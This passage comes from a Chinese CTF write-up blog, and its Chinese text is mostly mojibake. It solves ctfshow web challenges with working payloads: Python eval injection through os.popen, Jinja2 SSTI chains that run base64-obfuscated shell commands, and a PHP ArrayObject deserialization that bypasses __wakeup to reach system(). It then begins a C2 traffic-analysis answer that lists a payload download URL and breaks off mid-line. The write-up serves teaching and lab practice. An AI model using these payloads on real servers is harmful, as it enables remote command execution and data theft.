class="string">&#x27;show2.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        filename = request.args.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;filename&#x27;</span> <span class="keyword">in</span> request.args:              </span><br><span class="line">            <span class="keyword">return</span> send_file(filename, as_attachment=<span class="literal">True</span>)</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = request.args.get(<span class="string">&#x27;eval&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;hello,<span class="subst">&#123;<span class="built_in">eval</span>(s)&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span>():</span></span><br><span class="line">   session.pop(<span class="string">&#x27;loggedin&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">   session.pop(<span class="string">&#x27;id&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">   session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">   session.pop(<span class="string">&#x27;role&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">   <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>helloè·¯ç”±å¤„æœ‰ä¸ªevalæ¼æ´ï¼Œè¿™æ ·ä¼ å‚æ˜¯å¾ˆå±é™©çš„ï¼Œ</p><p><img src="/images/2023ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20230406161902169.png" alt="image-20230406161902169"></p><p>å‚è€ƒ</p><p><code>https://www.anquanke.com/post/id/84891/</code></p><p>``<a href="http://1ca40a3d-c1de-44e7-bd25-dda1d37a3031.challenge.ctf.show/hello/?eval=__import__(&#39;os&#39;).popen">http://1ca40a3d-c1de-44e7-bd25-dda1d37a3031.challenge.ctf.show/hello/?eval=__import__(&#39;os&#39;).popen</a>(â€˜cat /flag_is_h3reâ€™).read()`</p><p>å³å¯</p><h3 id="easy-ssti"><a href="#easy-ssti" class="headerlink" title="easy_ssti"></a>easy_ssti</h3><p>å³é”®æºä»£ç æœ‰zipåŒ…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template_string,render_template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span>(<span class="params">name=<span class="literal">None</span></span>):</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;hello.html&#x27;</span>,name=name)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello/&lt;name&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hellodear</span>(<span class="params">name</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;ge&quot;</span> <span class="keyword">in</span> name:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(<span class="string">&#x27;hello %s&#x27;</span> % name)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;f&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> name:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(<span class="string">&#x27;hello %s&#x27;</span> % name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Nonononon&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p> if â€œgeâ€ in name:<br>        return render_template_string(â€˜hello %sâ€™ % name)</p><p>payload è¦æœ‰  ge</p><p> elif â€œfâ€ not in name:<br>        return render_template_string(â€˜hello %sâ€™ % name)</p><p>payload ä¸èƒ½æœ‰f</p><p>å…ˆè·å–å¯ç”¨åŸºç±»</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">å››ç§æ–¹æ³•çš†å¯</span><br><span class="line">1,   &#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()&#125;&#125;</span><br><span class="line"></span><br><span class="line">2,   &#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()&#125;&#125;</span><br><span class="line">3,   &#123;&#123;&#x27;&#x27;.__class__.__mro__[-1].__subclasses__()&#125;&#125;</span><br><span class="line">4ï¼Œ &#123;&#123;().__class__.__mro__[1].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure><p>è·å–åˆ°åï¼Œç”¨è„šæœ¬å—¦ä¸€ä¸‹å¯ç”¨çš„ç±»</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†æŸ¥æ‰¾åˆ°çš„çˆ¶ç±»åˆ—è¡¨æ›¿æ¢åˆ°dataä¸­</span></span><br><span class="line">data = <span class="string">r&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    [&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, ......]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># åœ¨è¿™é‡Œæ·»åŠ å¯ä»¥åˆ©ç”¨çš„ç±»ï¼Œä¸‹é¢ä¼šä»‹ç»è¿™äº›ç±»çš„åˆ©ç”¨æ–¹æ³•</span></span><br><span class="line">userful_class = [<span class="string">&#x27;linecache&#x27;</span>, <span class="string">&#x27;os._wrap_close&#x27;</span>, <span class="string">&#x27;subprocess.Popen&#x27;</span>, <span class="string">&#x27;warnings.catch_warnings&#x27;</span>, <span class="string">&#x27;_frozen_importlib._ModuleLock&#x27;</span>, <span class="string">&#x27;_frozen_importlib._DummyModuleLock&#x27;</span>, <span class="string">&#x27;_frozen_importlib._ModuleLockManager&#x27;</span>, <span class="string">&#x27;_frozen_importlib.ModuleSpec&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&quot;&#x27;(.*?)&#x27;&quot;</span>)</span><br><span class="line">class_list = re.findall(pattern, data)</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> class_list:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> userful_class:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> c:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(class_list.index(c)) + <span class="string">&quot;: &quot;</span> + c)</span><br></pre></td></tr></table></figure><p><img src="/images/2023ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20230406171826914.png" alt="image-20230406171826914"></p><p>å¯ä»¥çœ‹åˆ°132çš„os._wrap_closeå¯ç”¨ popenä¹Ÿå¯ç”¨</p><p><code>http://a5d0ef3a-4dec-4de0-9564-0bd0be13b83e.challenge.ctf.show/hello/&#123;&#123;"".__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('whoami').read()&#125;&#125;</code>å³å¯å‘½ä»¤æ‰§è¡Œ</p><p>ä½†æ˜¯ä¸‹é¢æ‰§è¡Œls / æ—¶å‡ å¥ä¸å¯ä»¥äº†ï¼Œæ˜¾ç¤º404</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">http://a5d0ef3a-4dec-4de0-9564-0bd0be13b83e.challenge.ctf.show/hello/&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__base__.__subclasses__()[132].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;ls $(echo Lw== | base64 -d)&#x27;</span>).<span class="built_in">read</span>()&#125;&#125;</span><br><span class="line"></span><br><span class="line">http://a5d0ef3a-4dec-4de0-9564-0bd0be13b83e.challenge.ctf.show/hello/&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__base__.__subclasses__()[132].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;$(echo bHM= | base64 -d) $(echo Lw== | base64 -d)&#x27;</span>).<span class="built_in">read</span>()&#125;&#125;</span><br><span class="line"></span><br><span class="line">http://a5d0ef3a-4dec-4de0-9564-0bd0be13b83e.challenge.ctf.show/hello/&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__base__.__subclasses__()[132].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;cat $(echo Li4vZmxhZw== | base64 -d)&#x27;</span>).<span class="built_in">read</span>()&#125;&#125;</span><br><span class="line"></span><br><span class="line">å®˜æ–¹</span><br><span class="line">/hello/&#123;&#123; <span class="string">&quot;&quot;</span>.__class__.__base__ .__subclasses__()[132].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](request.args.get(<span class="string">&quot;ctfshow&quot;</span>)).<span class="built_in">read</span>()&#125;&#125;ge?ctfshow=cat /flag </span><br><span class="line"></span><br><span class="line">POC1:</span><br><span class="line">&#123;&#123;g.pop.__globals__.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>).<span class="built_in">read</span>()&#125;&#125;</span><br><span class="line">POC2:</span><br><span class="line">&#123;&#123;application.__init__.__globals__.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">.<span class="built_in">read</span>()&#125;&#125;</span><br><span class="line">POC3:</span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">.<span class="built_in">read</span>()&#125;&#125;</span><br></pre></td></tr></table></figure><p><code>http://a5d0ef3a-4dec-4de0-9564-0bd0be13b83e.challenge.ctf.show/hello/&#123;&#123;"".__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('cat $(echo Li4vZmxhZw== | base64 -d)').read()&#125;&#125;</code></p><h4 id="easy-php"><a href="#easy-php" class="headerlink" title="easy_php"></a>easy_php</h4><p>å¼€å±€ç»™äº†æºä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-03-24 10:16:33</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-03-25 00:25:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;not allowed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        system(<span class="keyword">$this</span>-&gt;ctfshow);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;1+1&gt;2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/^[Oa]:[\d]+/i&quot;</span>, <span class="variable">$data</span>))&#123;</span><br><span class="line">    unserialize(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ˜¾ç„¶æ˜¯ååºåˆ—åŒ–ï¼Œè¿™é‡Œè¦çŸ¥é“ä¸€äº›é­”æœ¯æ–¹æ³•ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">_construct() å½“åˆ›å»ºå¯¹è±¡æ—¶è§¦å‘ï¼Œä¸€èˆ¬ç”¨äºåˆå§‹åŒ–å¯¹è±¡ï¼Œå¯¹å˜é‡èµ‹åˆå€¼</span><br><span class="line">__sleep() ä½¿ç”¨serialize()æ—¶è‡ªåŠ¨è§¦å‘ </span><br><span class="line">__wakeup() ä½¿ç”¨unserialize()æ—¶è‡ªåŠ¨è§¦å‘</span><br><span class="line">__destruct() å½“ä¸€ä¸ªå¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘</span><br><span class="line">__toString() å½“ä¸€ä¸ªç±»è¢«å½“æˆå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘</span><br><span class="line">__invoke() å½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶è§¦å‘</span><br><span class="line">__call() åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘ </span><br><span class="line">__callStatic() åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘ </span><br><span class="line">__get() ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®</span><br><span class="line">__set() ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§</span><br><span class="line">__isset() åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨<span class="keyword">isset</span>()æˆ–<span class="keyword">empty</span>()è§¦å‘</span><br><span class="line">__unset() åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨<span class="keyword">unset</span>()æ—¶è§¦å‘</span><br></pre></td></tr></table></figure><p>__wakeup() ä½¿ç”¨unserialize()æ—¶è‡ªåŠ¨è§¦å‘ ï¼Œä»£ç ä¸­ä½¿ç”¨äº† unserializeå‡½æ•°ï¼Œé‚£å°±ä¼šé”€æ¯</p><p>åœ¨php5ä¸­ç»•è¿‡__wakeup()å°†å¯¹è±¡å±æ€§çš„ä¸ªæ•°å€¼å¤§äºçœŸå®çš„å±æ€§å°±ä¼šè·³è¿‡__wakeup()</p><p>php7ç¯å¢ƒä¸‹ï¼Œéœ€è¦åºåˆ—åŒ–ArrObjectç±»æ¥ç»•è¿‡</p><figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">php5ç¯å¢ƒä¸‹ï¼Œåªéœ€è¦åœ¨æ­£å¸¸ç”Ÿæˆçš„åºåˆ—åŒ–å­—ç¬¦ä¸²æ•°å­—å‰æ·»åŠ ä¸€ä¸ª+å·å³å¯ç»•è¿‡æ‰§è¡Œ</span><br><span class="line">æ–¹æ³•:</span><br><span class="line">echo serialize(new ctfshow())</span><br><span class="line">payload: </span><br><span class="line">O:+<span class="number">7</span>:<span class="string">&quot;ctfshow&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;ctfshow&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;cat /f*&quot;</span>;&#125;</span><br><span class="line">php7ç¯å¢ƒä¸‹ï¼Œéœ€è¦åºåˆ—åŒ–<span class="type">ArrObject</span>ç±»æ¥ç»•è¿‡</span><br><span class="line">æ–¹æ³•:</span><br><span class="line">echo serialize(new <span class="type">ArrayObject</span>(new ctfshow()));</span><br><span class="line">payload:</span><br><span class="line">C:<span class="number">11</span>:<span class="string">&quot;ArrayObject&quot;</span>:<span class="number">61</span>:&#123;x:i:<span class="number">0</span>;O:<span class="number">7</span>:<span class="string">&quot;ctfshow&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;ctfshow&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;cat /f*&quot;</span>;&#125;;m:a:<span class="number">0</span>:&#123;&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ­¤é¢˜ä¸­ä¸ºphp7</p><p>payload  è‡ªå·±åŠ ä¸€ä¸ªpublicå˜é‡å³å¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctfshow</span>=<span class="string">&#x27;cat /f*&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;not allowed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        system(<span class="keyword">$this</span>-&gt;ctfshow);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;1+1&gt;2&#x27;</span>];</span><br><span class="line"><span class="keyword">print</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> <span class="built_in">ArrayObject</span>(<span class="keyword">new</span> ctfshow()));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//C:11:&quot;ArrayObject&quot;:61:&#123;x:i:0;O:7:&quot;ctfshow&quot;:1:&#123;s:7:&quot;ctfshow&quot;;s:7:&quot;cat /f*&quot;;&#125;;m:a:0:&#123;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p><code>http://bd6bbd85-fa6e-4a78-ab40-c83485c956ed.challenge.ctf.show/?1%2b1&gt;2=C:11:&quot;ArrayObject&quot;:61:&#123;x:i:0;O:7:&quot;ctfshow&quot;:1:&#123;s:7:&quot;ctfshow&quot;;s:7:&quot;cat /f*&quot;;&#125;;m:a:0:&#123;&#125;&#125;</code></p><p><img src="/images/2023ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20230406223747040.png" alt="image-20230406223747040"></p><h4 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h4><blockquote><p>ä¸€ç›´åœ¨è·¯ä¸Š</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2023æ•°å­—ä¸­å›½åˆ›æ–°å¤§èµ›-ç½‘ç»œæ•°æ®å®‰å…¨èµ›é“-æ•°æ®å®‰å…¨äº§ä¸šäººæ‰èƒ½åŠ›æŒ‘æˆ˜èµ›-é¢„èµ›wp</title>
      <link href="/2023/04/01/CTFS/2023%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B-%E7%BD%91%E7%BB%9C%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93-%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E4%BA%A7%E4%B8%9A%E4%BA%BA%E6%89%8D%E8%83%BD%E5%8A%9B%E6%8C%91%E6%88%98%E8%B5%9B-%E9%A2%84%E8%B5%9Bwp/"/>
      <url>/2023/04/01/CTFS/2023%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B-%E7%BD%91%E7%BB%9C%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93-%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E4%BA%A7%E4%B8%9A%E4%BA%BA%E6%89%8D%E8%83%BD%E5%8A%9B%E6%8C%91%E6%88%98%E8%B5%9B-%E9%A2%84%E8%B5%9Bwp/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/others/image-20230406143344755.png" alt="image-20230406143344755"></p><p><strong>C2æµé‡åˆ†æ.1</strong></p><p>EDRåœ¨ä¸€å°æœºå¯†è®¡ç®—æœºä¸Šæ£€æµ‹åˆ°ç»ˆæ­¢k4.exeè¿›ç¨‹çš„è¡Œä¸ºï¼Œå–è¯äººå‘˜å–å‡ºæ¥äº†è¯¥æœºå™¨çš„é•œåƒæµé‡ï¼Œè¯·åˆ†æé™„ä»¶æµé‡ï¼Œå›ç­”å¯¹åº”é—®é¢˜ã€‚ï¼ˆæ³¨æ„ï¼šé¢˜ç›®ä¸­çš„ç¨‹åºå¯èƒ½å­˜åœ¨æ¶æ„æ“ä½œï¼Œå¦‚æœéœ€è¦è¿è¡Œæˆ–è°ƒè¯•ï¼Œè¯·åœ¨è™šæ‹Ÿæœºä¸­æ“ä½œï¼‰</p><p><a href="https://pan.baidu.com/s/1ldNxI6mMfduIxjtAOSMcZQ">https://pan.baidu.com/s/1ldNxI6mMfduIxjtAOSMcZQ</a></p><p><a href="https://pan.baidu.com/s/1ldNxI6mMfduIxjtAOSMcZQ">é™„ä»¶ä¸‹è½½</a> æå–ç ï¼ˆGAMEï¼‰<a href="https://share.weiyun.com/QbZIcyjq">å¤‡ç”¨ä¸‹è½½</a></p><p>è¯·æäº¤Payloadçš„å®Œæ•´ä¸‹è½½åœ°å€ã€‚ï¼ˆç­”æ¡ˆç¤ºä¾‹ï¼š<a href="http://xxx.xxx.xxx/xxx%EF%BC%89">http://xxx.xxx.xxx/xxxï¼‰</a></p><p><code>http://imgcache.cloudservicesdevc.tk/picturess/2023/RDSv38.dll</code></p><p><strong>C2æµé‡åˆ†æ.2</strong></p><p>è¯·æäº¤Payloadçš„SHA256å“ˆå¸Œå€¼ã€‚ï¼ˆå­—æ¯å¤§å†™ï¼Œè¯·æ ¹æ®æµé‡å†…å®¹ä½œç­”ï¼‰</p><p>å³é”®å°†è¿™ä¸ªRDSv38.dllæ–‡ä»¶å¯¼å‡ºç„¶åsha256å³å¯</p><p>AA2CBD3103CECAF189F93D787C602679E156CC6FD90E22646D637F01C64222CF</p><p><img src="/images/others/image-20230401164658387.png" alt="image-20230401164658387"></p><p>n6IcHjmQUNOd6TxOkV6WRigEPUZFkO2TIu8cS6MRyrE=</p><p>Aj0S2EgsjOFd_JRsOjcBB_5-fZ1H-9tZVF67-qOWCbw=</p><p>Aj0S2EgsjOFd_JRsOjcBB_5-fZ1H-9tZVF67-qOWCbw=</p><p>Z-Ur0AYZQ9-nNO_O6j5B1slASR-YR2tsssycqHNc_so=</p><p>eBp92fUD7Lk_6qXR2pIjFt3sBH-lW0ul830S-sO6QCQ=</p><p>Erj5UoZfpxT47Bjpg8qg1XmMCKZyKBj1bJ0otszVZPk=</p><p>qkwNBcGK7ZcOrlKKcflivlyiatdAsb2u_sH_-IB5R_Y=</p><p>0smJ2LvvnQonNICFpjOF8CeuOcMIuYLNVbCDucWSVaw=</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">PS D:\vscodework&gt; python3 -u &quot;d:\vscodework\ctf\other\shujusai.py&quot;</span><br><span class="line">è§£å¯†åä¿¡æ¯ï¼š I&#x27;m a hacker.</span><br><span class="line">PS D:\vscodework&gt; python3 -u &quot;d:\vscodework\ctf\other\shujusai.py&quot;</span><br><span class="line">è§£å¯†åä¿¡æ¯ï¼š This system has been hacked by me</span><br><span class="line">PS D:\vscodework&gt; python3 -u &quot;d:\vscodework\ctf\other\shujusai.py&quot;</span><br><span class="line">è§£å¯†åä¿¡æ¯ï¼š Next, I want to obtain some data</span><br><span class="line">PS D:\vscodework&gt; python3 -u &quot;d:\vscodework\ctf\other\shujusai.py&quot;</span><br><span class="line">åŠ 